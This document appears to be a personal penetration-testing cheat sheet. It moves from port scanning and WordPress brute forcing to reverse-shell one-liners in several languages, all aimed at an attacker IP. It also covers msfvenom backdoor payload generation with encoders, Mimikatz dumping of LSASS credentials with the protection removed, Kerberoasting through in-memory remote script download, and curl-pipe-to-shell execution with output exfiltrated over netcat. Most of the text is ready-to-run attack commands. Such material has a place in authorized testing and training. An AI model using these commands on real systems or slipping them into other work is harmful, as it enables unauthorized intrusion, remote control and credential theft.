# Port Mapping

## Threader3000

[usage:] threader3000.py

_install: pip3 install threader3000_

NOTE: I typically start with Threader since it will do a quick basic scan, and then recommend to run nmap on anything interesting with suggested options. 

For download/instructions:
https://github.com/dievus/threader3000

---

## NMAP

[usage:]

### Scan all ports:
sudo nmap -p- [target_ip]

### Scan all TCP and UDP ports:
sudo nmap -sU -sT -p- [target_ip]

### Targeted scan: 
sudo nmap -p[port1],[port2],[etc] -sV -sC -T4 -Pn -oA [target_ip]

### Scan w/ Safe Scripts:
sudo nmap --script "safe" -p- [target_ip]

### Scan for exploits (may crash the server):
sudo nmap --script "exploit" -p- [target_ip]

### Scan host OS:
sudo nmap -O [target_ip]

### Scan and skip network discovery:
sudo nmap -PN [target_ip]

### Scan without a reverse lookup (helps speed up process):
sudo nmap -n [target_ip]

### Stealthy Scans:
sudo nmap -sS [target_ip]
sudo namp -PN -p [port] (-sF -sX -sN) [target_ip]

### Detect Service Version:
sudo nmap -PN -p [port] -sV [target_ip]

### Logging:
sudo nmap -oN [filename].nmap [options]  [target_ip]


# Website Directory Enumeration

### Gobuster
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40

### Dirsearch
dirsearch -u [target]:[port] -e -x 400,500 -r -t 100
use -x to exclude ports.


# Wordpress Enumeration

### WPScan

#### Scan and enumerate for a username
wpscan --url http://hostname/wp-login -e u

#### Scan and enumerate for a password and user
wpscan --url http://hostname --usernames [wordlist of usernames] --passwords [wordlist of passwords]

### Hydra

#### Enumerate Wordpress for Username
hydra -V -L [wordlist of names] -p random [hostname] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'

#### Enumerate Wordpress for Password
hydra -V -l [known username] -P [wordlist of passwords]  [hostname] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid password'


# Reverse Shells

### Netcat Listener (1st - Run on Attackbox)
```bash
rlwrap nc -nvlp 53
```

### Netcat For Linux (2nd - Run on Victim)
```bash
nc [attackbox_ip]  [port] –e /bin/bash
```

or

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Netcat For Windows (2nd - Run on Victim)
nc.exe [attackbox_ip]  [port] –e cmd.exe

#### Stablizing Reverse Shell

On shell w/ victim if they have python:
```bash
sh-4.2$ which python
/usr/bin/python
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```

Sometimes this is enough, but if you wanna go a bit further...

Ctrl-Z to background the current window:
```bash
bash-4.2$ ^Z
[1]+  Stopped                 nc -lnvp 1234
root@ip-10-10-8-251:~# stty raw -echo
root@ip-10-10-8-251:~# nc -lnvp 1234

bash-4.2$ export TERM=XTERM
```

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### PERL Reverse Shell
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```python
### Python Reverse Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### XTerm
Run on Victim:
```bash
xterm -display 10.0.0.1:1
```

Run on Attackbox:
```bash
# uses port 6001 by default
Xnest :1
xhost +targetip
```

### Meterpreter
One liner for reverse shell:
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"
```

MSFVenom

One liner for Windows:
```bash
msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=<listening_host> LPORT=<listening_port> --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/ # One liner start meterpretermsfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
```

Another for Windows:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=4444 -f exe -o backdoor.exe
```

One for Linux:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f elf > reverse.elf
```

Lots more examples here:
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom


# Mimikatz

```shell-session
mimikatz # privilege::debug
Privilege '20' OK

sekurlsa::logonpasswords
```

If LSASS is protected we can try:

```bash
```shell-session
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started

mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]

mimikatz # sekurlsa::logonpasswords
```


# Kerberoasting

### Find SPNs to Attack (run on Victim)
```cmd
setspn -T medin -Q ​ */*
```


### Download Kerberoast Script and put in memory
```powershell
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
```
Then launch it:
```powershell
Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

There is a lot of other techniques regarding TGT/TGS Tickets etc in the [[Credentials Harvesting]] page.


# Cracking

### John 
```bash
john [hashfile] --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```

### Hashcat

For hashcat it's really about the type.
```bash
hashcat -m 5600 hash.txt passwordlist.txt --force
```

For Kerberoasting we want type 13100 which is Kerberos 5 TGS-REP etype 23:
```bash
# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

You can find an exhaustive list here:
https://hashcat.net/wiki/doku.php?id=hashcat


# Windows Privelege Escalation

### Powerup.ps1
```powershell
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
```

Example:
"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it [here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).

It is also where users passwords are stored in base64. Navigate to `C:\Windows\Panther\Unattend\Unattended.xml`

```bash
┌──(kali㉿kali)-[~/]
└─$ cat unattended.pass                                        
dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
                                                                                                                                                
┌──(kali㉿kali)-[~/]
└─$ cat unattended.pass | base64 -d
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T            
```


### WinPEAS

Check out:
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

WinPEAS Bat:
https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat


# Linux Privelege Escalation

### Find SUID Binaries
```bash
find / -perm +6000 2>/dev/null | grep '/bin/'
```


### LinPEAS

Check out:
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

#### From github
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### Local network
```bash
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

#### Without curl
```bash
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```

#### Excute from memory and send output back to the host
```bash
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 
#Victim
```

#### Output to file
```bash
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

### Other 
https://book.hacktricks.xyz/linux-hardening/privilege-escalation




